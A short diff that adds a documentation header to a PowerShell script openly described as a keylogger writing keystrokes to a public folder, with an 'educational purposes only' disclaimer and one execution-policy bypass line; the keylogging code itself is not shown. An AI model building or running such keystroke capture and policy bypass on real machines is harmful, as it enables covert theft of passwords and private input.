@@ -1,3 +1,28 @@
+<#
+.SYNOPSIS
+    A simple keylogger script that logs key presses to a specified file.
+
+.DESCRIPTION
+    This script sets the execution policy to bypass for the current session, 
+    adds the necessary .NET assembly for Windows Forms, and logs key presses 
+    to a specified file. It continuously checks for key presses and logs them 
+    along with any modifier keys pressed.
+
+.PARAMETER logfile
+    The path to the file where key presses will be logged.
+
+.NOTES
+    Author: [Your Name]
+    Date: [Date]
+    This script is for educational purposes only. Unauthorized use of keyloggers 
+    is illegal and unethical.
+
+.EXAMPLE
+    # Run the script
+    .\keylogger.ps1
+
+    # This will start logging key presses to C:\Users\Public\keylog.txt
+#>
 # Allow the script to run by bypassing the execution policy for this session
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 
